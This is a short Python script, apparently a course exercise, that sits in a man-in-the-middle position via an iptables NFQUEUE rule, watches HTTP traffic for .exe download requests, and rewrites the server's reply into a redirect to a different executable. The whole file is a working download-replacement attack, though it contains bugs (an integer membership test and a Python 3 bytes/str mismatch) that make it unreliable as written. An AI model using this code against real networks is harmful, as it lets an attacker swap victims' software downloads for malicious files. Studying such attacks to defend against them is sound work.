#!/usr/bin/env python3

# iptables -I FORWARD -j NFQUEUE --queue-num 0 <- **run command to create queue which we will bind to**
# If testing locally, -I INPUT, OUTPUT in two separate commands
# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**

import netfilterqueue
import scapy.all as scapy

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP packet being sent...")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe request found...")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP packet being received...")
            if scapy_packet[scapy.TCP].seq in ack_list[0]:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))



    packet.accept()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()